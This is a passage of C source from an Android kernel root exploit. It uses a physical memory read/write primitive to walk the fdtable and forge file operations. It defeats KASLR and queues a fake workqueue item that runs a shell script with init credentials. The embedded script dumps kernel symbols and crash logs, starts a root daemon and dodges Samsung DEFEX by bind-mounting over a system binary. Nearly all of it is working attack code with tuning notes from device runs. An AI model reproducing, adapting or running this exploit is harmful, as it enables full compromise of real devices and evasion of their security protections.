    if (!T) {
      pr_warning("wq-umh: fdtable: task-list walk failed, trying channel rq->curr\n");
      T = channel_own_task();
    }
    if (!T) {
      pr_warning("wq-umh: fdtable: channel own-task failed, trying perf\n");
      T = perf_own_task();
    }
    if (!T) {
      pr_warning("wq-umh: fdtable: own-task find failed\n");
      return 0;
    }
    g_own_task = T;
  }
  uint64_t files = rwf_read64(T + TASK_FILES_OFF);
  if (!is_direct_ptr(files)) {
    pr_warning("wq-umh: fdtable: T=%016zx bad files=%016llx\n", T,
               (unsigned long long)files);
    return 0;
  }
  uint64_t fdt = rwf_read64(files + FILES_FDT_OFF);
  if (!is_direct_ptr(fdt)) {
    pr_warning("wq-umh: fdtable: bad fdt=%016llx\n", (unsigned long long)fdt);
    return 0;
  }
  /* fdt header in ONE read (max_fds@0, fd@8) — one rd-ring slot, not two */
  uint64_t fdthdr[2] = {0};
  if (!rwf_phys_read(fdt + FDT_MAX_FDS_OFF, fdthdr, sizeof(fdthdr))) {
    pr_warning("wq-umh: fdtable: fdt header read failed\n");
    return 0;
  }
  uint64_t max_fds = fdthdr[0];
  uint64_t fdarr = fdthdr[1];
  if (!is_direct_ptr(fdarr) || (uint64_t)fd >= max_fds) {
    pr_warning("wq-umh: fdtable: bad fdarr=%016llx max_fds=%llu\n",
               (unsigned long long)fdarr, (unsigned long long)max_fds);
    return 0;
  }
  g_fdarr = fdarr;      /* cached for the cfg-forge second-fd arm */
  g_max_fds = max_fds;
  uint64_t F = rwf_read64(fdarr + (uintptr_t)fd * 8);
  if (!is_direct_ptr(F)) {
    pr_warning("wq-umh: fdtable: bad file=%016llx\n", (unsigned long long)F);
    return 0;
  }
  uint64_t fop = rwf_read64(F + 0x10);
  if (!is_kernel_ptr(fop)) {
    pr_warning("wq-umh: fdtable: file=%016llx has bad f_op=%016llx\n",
               (unsigned long long)F, (unsigned long long)fop);
    return 0;
  }
  g_fd_fop = fop;   /* cached: the repair block must not re-read (ring slots) */
  pr_success("wq-umh: fdtable: fd %d -> file=%016llx f_op=%016llx\n", fd,
             (unsigned long long)F, (unsigned long long)fop);
  return F;
}

/* Deployment-home indirection: every runtime path that defaults to
 * /data/local/tmp/a (adb/shell form) can be relocated with G4_HOME — the
 * boot app sets it to its private files dir (untrusted_app can only write
 * there).  gh() is NOT thread-safe; all call sites are single-threaded
 * exploit stages. */
static const char *g4home(void) {
  const char *h = getenv("G4_HOME");
  return (h && h[0]) ? h : "/data/local/tmp/a";
}
static const char *gh(const char *suffix) {
  static char hb[384];
  snprintf(hb, sizeof(hb), "%s%s", g4home(), suffix);
  return hb;
}

/* Pull the helper's output files into OUR (fsync-per-line) log and fsync
 * the files + directory.  The device panics when g4 exits (fuse collateral
 * at pipe teardown), killing the helper's dirty page-cache writes — cycle-3
 * evidence: helper completed, zero files on disk after reboot, only the
 * fsync'd log survived.  Also sleeps briefly first so the async helper can
 * finish its writes. */
static void wq_umh_readback(void) {
  sleep(3);   /* let the async helper finish */
  sync();
  static const char *files[] = {
    "/umh_id.txt", "/id.txt",
    "/cmdline.txt", "/pstore_ls.txt",
    "/last_kmsg.txt", "/dropbox_ls.txt",
    NULL
  };
  for (int i = 0; files[i]; i++) {
    int fd = open(gh(files[i]), O_RDONLY);
    if (fd < 0) {
      pr_info("wq-umh: readback %s: %s\n", files[i], strerror(errno));
      continue;
    }
    pr_info("wq-umh: readback %s:\n", files[i]);
    char buf[1024];
    ssize_t n;
    size_t total = 0;
    while (total < 65536 && (n = read(fd, buf, sizeof(buf))) > 0) {
      fwrite(buf, 1, n, stdout);
      total += (size_t)n;
    }
    fsync(fd);
    close(fd);
    pr_info("\nwq-umh: readback %s done (%zu bytes)\n", files[i], total);
  }
  {
    int fd = open("/data/local/tmp/cap/id.txt", O_RDONLY);
    if (fd >= 0) {
      pr_info("wq-umh: readback cap/id.txt:\n");
      char buf[1024];
      ssize_t n;
      size_t total = 0;
      while (total < 65536 && (n = read(fd, buf, sizeof(buf))) > 0) {
        fwrite(buf, 1, n, stdout);
        total += (size_t)n;
      }
      fsync(fd);
      close(fd);
      pr_info("\nwq-umh: readback cap/id.txt done (%zu bytes)\n", total);
    }
  }
  int dfd = open(gh(""), O_RDONLY | O_DIRECTORY);
  if (dfd >= 0) { fsync(dfd); close(dfd); }
  sync();
}

/* Post-root arm + cfg-forge + flag repair — ALL best-effort; runs only
 * AFTER the helper already fired (the root path never depends on it).  This
 * is the device-proven order (cycle 88): queue → verify → storm → helper,
 * with the arm/repair as post-root hardening.  The 2026-08-18 build ran
 * this block BEFORE the queue — its ~25 forge ops (listwalk hops, two arms,
 * park) pushed a0 forging past the 32-slot physical rd array on device
 * (GL_RWF_SLOTS=64 doesn't cap at the array size), so 0/84 cycles ever
 * triggered: the queue writes overflowed, or the cycle died in the repair.
 *
 * The flag repair writes vmemmap — only possible via the configfs virtual
 * write, which needs an armed ashmem attr fd.  The fuse arm normally gets
 * its struct file* from the perf FILE leak, which finds NO candidates on
 * the BZA5 device ("fuse-bringup: no file candidates").  Fallback: resolve
 * our own ashmem fd via the fdtable walk (fd_to_file) and arm it ourselves.
 * The repair itself is only attempted when the cfg-forge parked: its
 * per-page descriptor writes then go through the parked pwrite-forge
 * (deterministic) instead of the a0 merge — a missed a0 descriptor write
 * leaves bin_buffer stale and the pwrite lands the flags qword at a WILD
 * address (panic class).  Even a hang here is tolerable post-root: the
 * helper's markers/captures are already synced and g4d is already up. */
static void wq_umh_post_root_arm_repair(int afd) {
  int repair_ok = 0;
  if (getenv("RWF_DEBUG"))
    pr_info("wq-umh: repair inputs: afd=%d g_bringup_F=%016llx fake_fops=%016zx page_base=%016zx\n",
            afd, (unsigned long long)g_bringup_F, fake_fops, page_base);
  if (afd >= 0 && g_bringup_F) {
    /* fuse arm already live (perf file leak path) — repair directly */
    pr_info("wq-umh: repair via already-armed afd=%d\n", afd);
    g_wq_armed_fd = afd;
    repair_ok = rwf_repair_flags_wq_umh(afd, page_base);
  } else {
    int repair_fd = afd >= 0 ? afd : open_ashmem_device();
    if (repair_fd < 0) {
      pr_warning("wq-umh: no ashmem fd for repair\n");
    } else {
      uintptr_t F = fd_to_file(repair_fd);
      if (F) {
        uint64_t fop = g_fd_fop;   /* cached by fd_to_file — no re-read */
        if (getenv("RWF_DEBUG"))
          pr_info("wq-umh: repair fd=%d F=%016llx fop=%016llx fake_fops=%016zx\n",
                  repair_fd, (unsigned long long)F, (unsigned long long)fop,
                  fake_fops);
        /* "already armed" only counts if WE armed it (g_bringup_F) — a stale
         * channel read can also return fake_fops; re-arming is idempotent */
        if (fop != (uint64_t)fake_fops || !g_bringup_F) {
          if (!fake_fops) {
            pr_warning("wq-umh: no payload fops table — cannot arm\n");
          } else {
            pr_info("wq-umh: arming fd %d via fdtable walk (F=%016llx f_op=%016llx)\n",
                    repair_fd, (unsigned long long)F, (unsigned long long)fop);
            g_bringup_orig_fops = fop;
            g_cfg_buf = page_base + 0x1140;  /* fake configfs_buffer in spray page */
            int arm_ok = rwf_write64(F + 0x10, fake_fops);
            if (arm_ok) arm_ok = rwf_write64(F + 0x20, g_cfg_buf);
            /* FMODE_CAN_WRITE RMW (DELTA-NOTES §1) — the channel read is
             * flaky; never clobber f_mode on a failed read (0|CAN_WRITE
             * would drop FMODE_READ etc.), skip the arm instead */
            uint32_t fm = 0;
            int fm_ok = 0;
            for (int t = 0; t < 3 && !fm_ok; t++)
              fm_ok = rwf_phys_read(F + 0xc, &fm, 4);
            if (arm_ok && fm_ok) {
              fm |= 0x40000;
              arm_ok = rwf_phys_write(F + 0xc, &fm, 4);
            } else if (!fm_ok) {
              pr_warning("wq-umh: f_mode read stalled — arm aborted\n");
              arm_ok = 0;
            }
            if (!arm_ok)
              pr_warning("wq-umh: arm writes failed\n");
            else {
              g_wq_armed_fd = repair_fd;
              /* park a second armed fd on the rd array: post-arm forging
               * becomes pure pwrite, no forge-slot budget (the 32-slot wall
               * starved the queue writes — boot71-81) */
              cfg_forge_arm();
            }
          }
        }
        /* the repair only runs when the cfg-forge parked (see block comment);
         * otherwise this is exactly the device-proven repair-skipped flow */
        if (cfg_forge_enabled())
          repair_ok = rwf_repair_flags_wq_umh(repair_fd, page_base);
        else
          pr_warning("wq-umh: flag repair skipped (cfg-forge not parked)\n");
      } else {
        pr_warning("wq-umh: fdtable walk failed — flag repair skipped\n");
      }
    }
  }
  if (repair_ok)
    pr_success("wq-umh: flags repaired\n");
  else
    pr_warning("wq-umh: flags repair failed/skipped\n");
}

/* atexit wrapper: pr_error exits with exit(-1) all over the failure paths,
 * so the disarm must run via atexit to cover them (userspace handlers run
 * before do_exit's fd teardown — the channel/configfs are still usable). */
static void wq_umh_disarm_atexit(void) {
  rwf_disarm_forged_slots(g_wq_armed_fd);
  /* exit-panic backstop: fork a child that inherits every fd and then just
   * sleeps.  While it lives, g4's exit teardown releases nothing (every
   * file's refcount stays >0), so the balancing image-page refs held by the
   * holder/peek/rd pipes are never put — the whole anon_pipe_buf_release →
   * bad_page class at exit is suppressed, not just the rd ring (the disarm
   * above covers rd even if the child is later killed; the holder pipe's
   * 128-slot array would need its pipe_buffer VA resolved through the ring,
   * which costs 6 forge slots the post-queue verify/requeue can't spare).
   * Device residue: one sleeping "g4hold" process per cycle (freed on
   * reboot; if it is OOM-killed the teardown BUGs fire then — no worse than
   * before this fix). */
  pid_t c = fork();
  if (c == 0) {
    close(0);
    close(1);
    close(2);
    prctl(PR_SET_NAME, "g4hold", 0, 0, 0);
    for (;;)
      pause();
  }
}

/* GL_WQ_UMH: plant a fake work_struct running call_usermodehelper_exec_work
 * on a fake subprocess_info ("/system/bin/sh /data/local/tmp/a/umh.sh"),
 * queued onto system_wq's per-cpu pwq (or unbound pool fallback). The helper
 * runs with init creds. Cursor/offset persistence lets rescans resume.
 * afd: the ashmem fd armed with the payload fops table (or -1) — used for
 * the pre-trigger struct-page flag repair. */
static __attribute__((always_inline)) int wq_umh_root(int afd) {
  static const uint64_t seed[] = { 0x108, 0x100, 0x110, 0xf8, 0x118, 0xf0 };
  pr_info("wq-umh: begin\n");
  /* single atexit registration covers every exit below (incl. pr_error's
   * exit(-1)): disarms the rd ring (if armed) and forks the fd-holder child
   * that suppresses the whole pipe-teardown bad_page class. */
  {
    static int atexit_done;
    if (!atexit_done) { atexit_done = 1; atexit(wq_umh_disarm_atexit); }
  }
  const char *umh_sh =
    "#!/system/bin/sh\n"
    /* $0 is this script's own path — derive the deployment home from it
     * (adb form: /data/local/tmp/a; boot-app form: the app's private files
     * dir).  All paths below use $A so one binary serves both. */
    "A=$(dirname \"$0\")\n"
    /* Builtin-only creds diagnostic FIRST: `id` emitted NOTHING in the
     * cycle-3 run (external toybox commands may fail silently under the
     * UMH creds state), while builtin echo always lands.  /proc/self/status
     * via mksh builtins gives Uid/Gid/Cap, NoNewPrivs, Seccomp — the real
     * creds evidence — without any external binary.  The helper's
     * stdout/stderr land in g4umh.log on this kernel (cycle-88 proof). */
    "echo UMH-ALIVE\n"
    "while IFS= read -r L; do case \"$L\" in Uid:*|Gid:*|Cap*:|NoNewPrivs:*|Seccomp:*) echo \"PS: $L\";; esac; done < /proc/self/status\n"
    "echo UMH-STATUS-DONE\n"
    "id; echo \"ID-RC=$?\"\n"
    "id >&2; echo \"ID2-RC=$?\" >&2\n"
    /* file captures: sync after EVERY write — the device panics when g4
     * exits (fuse collateral at pipe teardown) and dirty page-cache writes
     * die with it (cycle-3: helper completed, zero files on disk after). */
    "id > $A/umh_id.txt 2>&1; echo \"W-ID-RC=$?\"; sync\n"
    "touch $A/.umh_rooted; echo \"W-MARK-RC=$?\"; sync\n"
    /* root daemon FIRST, right after the marker: the 13:39 rooted cycle
     * wrote every capture yet never produced a g4d/pidfile — the helper
     * most plausibly died in the sync-heavy capture tail before reaching
     * the g4d line at the end.  Start g4d here so a mid-script death can't
     * cost the root shell.  The helper's stdout is NOT reliably captured,
     * so log to files: g4d.rc (exit code) + g4d.out (stderr) + g4d.mnt
     * (mount errors).
     * DEFEX safeplace kills uid=0 execs from /data/local/tmp (16:36 cycle:
     * "[DEFEX] Safeplace violation [task=sh, child=/data/local/tmp/a/g4d,
     * uid=0]" → SIGKILL, G4D-RC=137).  Bind-mount g4d over a dormant
     * system daemon binary so the exec's path is DEFEX-safe; lazy-umount
     * right after (g4d daemonizes at once and sets its own comm).  lmkd
     * never re-execs at runtime, so the shadow window is risk-free.
     * Fallback when the bind fails (no lmkd / mount denied): direct exec —
     * works wherever DEFEX is off. */
    "chmod 755 $A/g4d 2>/dev/null; "
    "if mount --bind $A/g4d /system/bin/lmkd 2>$A/g4d.mnt; then /system/bin/lmkd > $A/g4d.out 2>&1; umount -l /system/bin/lmkd 2>/dev/null; else $A/g4d > $A/g4d.out 2>&1; fi; echo \"G4D-RC=$?\" > $A/g4d.rc; sync\n"
    "cat /proc/last_kmsg > $A/last_kmsg.txt 2>/dev/null; sync\n"
    "dmesg > $A/dmesg.txt 2>/dev/null; sync\n"
    "cat /proc/iomem > $A/iomem.txt 2>/dev/null; sync\n"
    "cat /proc/cmdline > $A/cmdline.txt 2>/dev/null; sync\n"
    "cat /proc/kallsyms > $A/kallsyms.txt 2>/dev/null; sync\n"
    "id > $A/id.txt 2>&1; sync\n"
    "ls -la /sys/fs/pstore/ > $A/pstore_ls.txt 2>/dev/null; sync\n"
    "for f in /sys/fs/pstore/*; do cp $f $A/ 2>/dev/null; done; sync\n"
    /* dropbox keeps previous-boot SYSTEM_LAST_KMSG/SYSTEM_BOOT entries
     * across multiple boots — earlier panic evidence lives there.  Helper
     * is uid=0 u:r:kernel:s0: can read the dropbox dir that blocks shell
     * with EACCES. */
    "ls -la /data/system/dropbox/ > $A/dropbox_ls.txt 2>&1; sync\n"
    "for f in $(ls -t /data/system/dropbox/SYSTEM_LAST_KMSG@* 2>/dev/null | head -3); do cp $f $A/ 2>/dev/null; cp $f /data/local/tmp/cap/ 2>/dev/null; done; sync\n"
    "for f in $(ls -t /data/system/dropbox/SYSTEM_BOOT@* 2>/dev/null | head -3); do cp $f $A/ 2>/dev/null; cp $f /data/local/tmp/cap/ 2>/dev/null; done; sync\n"
    /* secondary: the original cap/ dir (works if root + policy allow) */
    "mkdir -p /data/local/tmp/cap && chmod 755 /data/local/tmp/cap; "
    "cat /proc/last_kmsg > /data/local/tmp/cap/last_kmsg.txt 2>/dev/null; "
    "dmesg > /data/local/tmp/cap/dmesg.txt 2>/dev/null; "
    "cat /proc/iomem > /data/local/tmp/cap/iomem.txt 2>/dev/null; "
    "cat /proc/cmdline > /data/local/tmp/cap/cmdline.txt 2>/dev/null; "
    "cat /proc/kallsyms > /data/local/tmp/cap/kallsyms.txt 2>/dev/null; "
    "id > /data/local/tmp/cap/id.txt 2>&1; "
    "ls -la /sys/fs/pstore/ > /data/local/tmp/cap/pstore_ls.txt 2>/dev/null; "
    "for f in /sys/fs/pstore/*; do cp $f /data/local/tmp/cap/ 2>/dev/null; done; "
    "chmod 644 /data/local/tmp/cap/* $A/*.txt 2>/dev/null; "
    "echo CAPTURES-DONE\n";
  int sfd = open(gh("/umh.sh"), O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0)
    pr_error("wq-umh: cannot write helper script\n");
  write(sfd, umh_sh, strlen(umh_sh));
  close(sfd);
  unlink(gh("/.umh_rooted"));

  /* fake subprocess_info blob at page_base + WQ_FAKE_UMH_OFF.
   * completion layout (E2E-proven): done@0, wait.lock@8, task_list@0x10/0x18.
   * Strings must sit clear of the completion: path @+0x20, script @+0x30
   * (up to 0x38 bytes incl NUL — covers app-private G4_HOME paths like
   * /data/user/0/com.mobilehackinglab.ghostlock/files/umh.sh = 55),
   * argv[] @+0x68, envp[] = the argv[2] NULL slot @+0x78 (envp is just a
   * NULL terminator; sharing the slot is legitimate).
   * Blob is 0x80 = the rwf_phys_write cap. */
  char script_path[0x38];
  snprintf(script_path, sizeof(script_path), "%s/umh.sh", g4home());
  if (strlen(script_path) + 1 > 0x38)
    pr_error("wq-umh: G4_HOME too long for the blob\n");
  uint8_t buf[0x80] = {0};
  memcpy(buf + 0x10, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x10)}, 8);
  memcpy(buf + 0x18, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x10)}, 8);
  memcpy(buf + 0x20, "/system/bin/sh", 15);
  memcpy(buf + 0x30, script_path, strlen(script_path) + 1);
  /* argv[] @ blob+0x68: { "/system/bin/sh", script, NULL }; envp @+0x78.
   * E2E-proven: path/argv must be full page-relative pointers — e stored the
   * raw offsets 0x1818/0x1828 here (the pb-prefixed add was dead code in e),
   * which faults in getname_kernel when the work actually runs. */
  memcpy(buf + 0x68, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
  memcpy(buf + 0x70, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x30)}, 8);
  int ok = rwf_phys_write(page_base + WQ_FAKE_UMH_OFF, buf, sizeof(buf));
  if (!ok)
    pr_error("wq-umh: data blob write failed\n");

  /* the func pointer needs the REAL slide.  arm64 KASLR is virtual-only
   * (physical placement fixed), so the channel's physical reads hit the
   * right memory regardless of slide and slid pointers come back with the
   * slide baked in.  The boot_id ctl_table entry carries THREE slid
   * pointers (procname/data/proc_handler) — cross-validating them yields a
   * bulletproof slide with no perf anchors and no init_task.stack (whose
   * runtime content differs from the static image on this kernel).  The old
   * validator's "slide < 16GB" window rejected the real 187GB slide seen
   * on-device (cycle 54: slide=0x2eae400000, 2MB-aligned, kernel high
   * half).  Bound now: read value in [PAGE_OFFSET, VMEMMAP_START), slide
   * 2MB-aligned and < 256GB (39-bit VA kernel space is 512GB).
   * Fallback: the old oracle/perf path (bringup_slide). */
  if (!g_slide_valid) {
    uintptr_t ent = data_addr(KIMAGE_TEXT_BASE + SYSCTL_BOOTID_ENTRY_OFF);
    /* one channel read of the whole 0x38-byte ctl_table entry yields BOTH
     * anchors (procname@0, proc_handler@0x18) — one rd-ring slot, not two. */
    int64_t slides[2] = { -1, -1 };
    uint64_t entbuf[7] = {0};
    for (int t = 0; t < 3; t++)
      if (rwf_phys_read(ent, entbuf, sizeof(entbuf)))
        break;
    static const struct { int idx; uint64_t expect_img; const char *name; } triplet[] = {
      { 0, 0x017CEDD0ULL, "procname" },      /* -> "boot_id" string */
      { 3, 0x009CD4CCULL, "proc_handler" },  /* -> proc_do_uuid */
      /* NB: the data field (+0x08) is unusable as an anchor — the oracle's
       * restore leaves a physmap-ALIAS pointer in it, not a canonical VA. */
    };
    for (int a = 0; a < 2; a++) {
      uint64_t v = entbuf[triplet[a].idx];
      int64_t s = (int64_t)(v - (KIMAGE_TEXT_BASE + triplet[a].expect_img));
      int ok = v >= 0xffffff8000000000ULL && v < VMEMMAP_START &&
               s >= 0 && !(s & 0x1fffff) && s < 0x4000000000LL;
      pr_info("wq-umh: slide anchor %s: read=%016llx slide=%016llx %s\n",
              triplet[a].name, (unsigned long long)v, (unsigned long long)s,
              ok ? "OK" : "reject");
      slides[a] = ok ? s : -1;
    }
    int64_t s = -1;
    if (slides[0] >= 0 && slides[0] == slides[1]) s = slides[0];
    if (s < 0) s = slides[1];   /* proc_handler alone (E2E-proven) */
    if (s >= 0) {
      kaslr_slide = s;
      kaslr_done = 1;
      kaslr_base = KIMAGE_TEXT_BASE + (uint64_t)s;
      g_slide_cached = s;
      g_slide_valid = 1;
      pr_success("wq-umh: channel slide=%016llx via bootid ctl_table\n",
                 (unsigned long long)s);
      /* advisory post-slide validators (NEVER reject — their runtime content
       * is unreliable on this kernel; log-only so device runs tell us).
       * GL_SLIDE_CHECK-gated: two channel slots are two too many when the
       * 32-slot rd ring is nearly full. */
      if (getenv("GL_SLIDE_CHECK")) {
        uint64_t st = 0, amm = 0;
      rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL + TASK_STACK_OFF),
                    &st, 8);
      rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL + TASK_ACTIVE_MM_OFF),
                    &amm, 8);
      pr_info("wq-umh: post-slide check init_task.stack=%016llx (expect %016llx) active_mm=%016llx (expect %016llx)\n",
              (unsigned long long)st,
              (unsigned long long)(KIMAGE_TEXT_BASE + (uint64_t)s + 0x024E0000ULL),
              (unsigned long long)amm,
              (unsigned long long)(KIMAGE_TEXT_BASE + (uint64_t)s + INIT_MM_OFF));
      }
    }
  }
  if (!g_slide_valid) {
    int64_t slide = bringup_slide();
    if (slide >= 0) {
      kaslr_slide = slide;
      kaslr_done = 1;
      kaslr_base = KIMAGE_TEXT_BASE + slide;
      g_slide_cached = slide;
      g_slide_valid = 1;
    }
  }
  uintptr_t func = text_addr(UMH_EXEC_WORK_BZA5);
  uint64_t qpool = 0;   /* pool the fake work got queued on (bound/unbound) */

  /* pco (per_cpu_offset[core]) is only needed by the seed-scan fallback —
   * read it lazily there; the pwqs-list walk doesn't need it, and every
   * channel op before the queue counts (the rd ring wraps at slot 31). */
  uint64_t pco = 0;
  uint64_t syswq = rwf_read64(data_addr(SYSWQ_BZA5) - 0x18);
  if (!is_direct_ptr(syswq))
    pr_warning("wq-umh: syswq=%016llx unusable\n", (unsigned long long)syswq);
  else
    goto syswq_ok;
  goto pool_walk;
syswq_ok:;
  /* pwqs-list walk (preferred): system_wq.pwqs.next points at cpu0's pwq
   * (init links pwqs in cpu order); pwqs_node sits at pwq+0x88 (BTF).  This
   * sidesteps the cpu_pwq field's storage form entirely (offset vs full VA
   * differs by boot environment). */
  uintptr_t pwq = 0;
  {
    uint64_t link = rwf_read64(syswq + 0);
    if (is_direct_ptr(link)) {
      uint64_t cand = link - 0x88;
      if (rwf_read64(cand + 8) == syswq) {
        pr_success("wq-umh: cpu_pwq via pwqs list walk: %016llx\n",
                   (unsigned long long)cand);
        pwq = cand;
      }
    }
  }
  /* scan candidate pwq offsets: persisted hit first, else cursor/seed */
  uint64_t offs[8];
  int noff = 0;
  uint64_t persisted_hit = 0;
  {
    char cbuf[24] = {0};
    int cfd = open(gh("/.cpupwq_off"), O_RDONLY);
    uint64_t val = 0;
    if (cfd >= 0) {
      read(cfd, cbuf, 23);
      close(cfd);
      val = strtoull(cbuf, NULL, 10);
    }
    if (val >= 8 && val <= 0x400) {
      pr_info("wq-umh: syswq=%016llx pco=%016llx (cpu_pwq@%llu persisted)\n",
              (unsigned long long)syswq, (unsigned long long)pco,
              (unsigned long long)val);
      offs[0] = val;
      noff = 1;
      if (val >= 9) {
        offs[1] = val - 8;
        noff = 2;
      }
      offs[noff] = val + 8;
      noff++;
      persisted_hit = val;
    } else {
      uint64_t cursor = 0;
      char cur[24] = {0};
      int cufd = open(gh("/.cpupwq_cursor"), O_RDONLY);
      if (cufd >= 0) {
        read(cufd, cur, 23);
        close(cufd);
        cursor = strtoull(cur, NULL, 10);
      }
      if (cursor > 63) cursor = 0;
      if (cursor == 0) {
        memcpy(offs, seed, sizeof(seed));
        noff = 6;
      }
      while (noff < 8) {
        uint64_t o = cursor * 8 + 8;
        if (o > 0x200) break;
        int dup = 0;
        for (int j = 0; j < noff; j++)
          if (offs[j] == o) { dup = 1; break; }
        if (!dup) offs[noff++] = o;
        cursor++;
      }
      persist_u64(gh("/.cpupwq_cursor"), cursor);
      pr_info("wq-umh: syswq=%016llx pco=%016llx (cpu_pwq DISCOVERY pass, cursor=%d)\n",
              (unsigned long long)syswq, (unsigned long long)pco, (int)cursor);
      if (noff < 1) {
        pr_warning("wq-umh: cpu_pwq discovery pass done — no hit this run (queue skipped; scan resumes next channel-up)\n");
        goto stage_failed;
      }
    }
  }
  uintptr_t pwq_scan = 0;
  for (int i = 0; !pwq && i < noff && !pwq_scan; i++) {
    uint64_t off = offs[i];
    uint64_t raw = rwf_read64(syswq + off);
    pr_info("wq-umh: scan @%zu raw=%016llx\n", (size_t)off,
            (unsigned long long)raw);
    if (raw == 0) continue;
    uint64_t cand;
    int cand_is_va = 0;
    if ((raw >> 28) == 0 && !is_direct_ptr(raw)) {
      /* percpu-offset form: resolve via per_cpu_offset[core] — read lazily
       * (the pwqs-list walk path never needs it; one ring slot saved) */
      if (!pco)
        pco = rwf_read64(data_addr(PER_CPU_OFFSETS) + (long)g_route_core * 8);
      cand = rwf_read64(raw + pco);
    } else if (raw >= kaslr_base &&
               raw < kaslr_base + 0x40000000ULL) {
      /* embedded first pcpu chunk (arm64): cpu_pwq for cpu0 is a full image
       * VA — no per_cpu_offset math. E2E-proven form on BZA5. */
      cand = raw;
      cand_is_va = 1;
    } else {
      continue;
    }
    /* back-check reads are flaky on the channel (missed punch = stale slot):
     * accept the candidate if ANY of up to 3 reads shows pwq->wq == syswq */
    uint64_t back = 0;
    for (int t = 0; t < 3 && back != syswq; t++)
      back = rwf_read64((cand_is_va ? data_addr(cand) : cand) + 8);
    pr_info("wq-umh: cpu_pwq cand @%zu raw=%016llx pwq=%016llx wq=%016llx\n",
            (size_t)off, (unsigned long long)raw,
            (unsigned long long)(cand_is_va ? data_addr(cand) : cand),
            (unsigned long long)back);
    if (back != syswq) continue;
    pr_success("wq-umh: cpu_pwq @off=%zu raw=%016llx\n", (size_t)off,
               (unsigned long long)raw);
    persist_u64(gh("/.cpupwq_off"), off);
    pwq_scan = cand_is_va ? data_addr(cand) : cand;
  }
  if (!pwq)
    pwq = pwq_scan;
  if (!(persisted_hit | pwq)) {
    pr_warning("wq-umh: cpu_pwq discovery pass done — no hit; trying unbound pool\n");
    goto pool_walk;
  }
  if (pwq) {
    /* bound-pool path: queue fake work on the cpu pwq */
    uint64_t pool = rwf_read64(pwq);
    if (!is_direct_ptr(pool)) goto pool_walk;
    qpool = pool;
    /* the link writes head->next/head->prev unconditionally — only safe on
     * an empty worklist (head->next == head); a busy pool falls back to the
     * unbound path (which waits for idle) instead of corrupting queued
     * kernel work */
    uint64_t wl_first = rwf_read64(pool + 0x28);
    if (wl_first != pool + 0x28) {
      pr_warning("wq-umh: bound pool busy, falling back\n");
      goto pool_walk;
    }
    /* work_color(+0x10) and refcnt(+0x18) in ONE 16-byte read (ring slots) */
    uint64_t pwq10[2] = {0};
    rwf_phys_read(pwq + 0x10, pwq10, sizeof(pwq10));
    uint32_t nr = (uint32_t)pwq10[0];
    uint32_t ref = (uint32_t)pwq10[1];
    if (nr > 15 || ref == 0) {
      pr_warning("wq-umh: bound pwq state bad (color=%u refcnt=%u)\n", nr, ref);
      goto pool_walk;
    }
    uint8_t fw[0x60] = {0};
    memcpy(fw + 0x00, &(__uint64_t[]){(uint64_t)((pwq | 5) | ((uint64_t)nr << 4))}, 8);
    memcpy(fw + 0x08, &(__uint64_t[]){(uint64_t)(pool + 0x28)}, 8);
    memcpy(fw + 0x10, &(__uint64_t[]){(uint64_t)(pool + 0x28)}, 8);
    memcpy(fw + 0x18, &(__uint64_t[]){(uint64_t)(func)}, 8);
    memcpy(fw + 0x20, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF)}, 8);
    /* subprocess_info fields (BTF): path@0x28, argv@0x30, envp@0x38 — all
     * full pointers into the data blob (E2E-proven: raw 0x1818 faults in
     * getname_kernel when the worker runs the work). */
    memcpy(fw + 0x28, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
    memcpy(fw + 0x30, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x68)}, 8);
    memcpy(fw + 0x38, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x78)}, 8);
    ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF, fw, sizeof(fw));
    if (!ok) goto pool_walk;
    /* counter writes per e: nr_in_flight[color]=1, nr_active=1,
     * refcnt=ref+1 (audit: my earlier version swapped nr_active/refcnt) */
    uint32_t one = 1;
    uint32_t ref1 = ref + 1;
    if (!rwf_phys_write(pwq + ((uintptr_t)nr << 2) + 0x1c, &one, 4)) goto bound_link_fail;
    if (!rwf_phys_write(pwq + 0x60, &one, 4)) goto bound_link_fail;
    if (!rwf_phys_write(pwq + 0x18, &ref1, 4)) goto bound_link_fail;
    if (!rwf_write64(pool + 0x30, page_base + WQ_FAKE_WORK_OFF + 8)) goto bound_link_fail;
    if (!rwf_write64(pool + 0x28, page_base + WQ_FAKE_WORK_OFF + 8)) goto bound_link_fail;
    pr_success("wq-umh: queued on system_wq BOUND pool (pwq=%016llx pool=%016llx)\n",
               (unsigned long long)pwq, (unsigned long long)pool);
    goto queued;
  }
pool_walk:;
  /* unbound pool fallback: find dfl_pwq on system_unbound_wq */
  {
    uint64_t wq = rwf_read64(data_addr(SYSWQ_BZA5));
    for (int t = 1; !is_direct_ptr(wq) && t <= 6; t++) {
      pr_warning("wq-umh: wq read flaky (try %d) got=%016llx — retrying\n", t,
                 (unsigned long long)wq);
      usleep(20000);
      wq = rwf_read64(data_addr(SYSWQ_BZA5));
    }
    if (!is_direct_ptr(wq))
      pr_error("wq-umh: bad wq\n");
    uintptr_t dfl = rwf_read64(wq + 0xc0);
    if (!is_direct_ptr(dfl)) {
      pr_warning("wq-umh: dfl_pwq@%d=%016llx invalid — dumping+scanning\n", 0xc0,
                 (unsigned long long)dfl);
      int found_off = 0;
      int nvalid = 0;
      for (int off = 0x80; off <= 0xf8; off += 8) {
        uint64_t v = rwf_read64(wq + off);
        pr_info("wq-umh: dump +%zu = %016llx\n", (size_t)off,
                (unsigned long long)v);
        if (!is_direct_ptr(v)) continue;
        if (nvalid > 7)
          pr_error("wq-umh: dfl_pwq not found\n");
        if (rwf_read64(v + 8) != wq) continue;
        nvalid++;
        if (is_direct_ptr(rwf_read64(v))) continue;
        found_off = off;
        break;
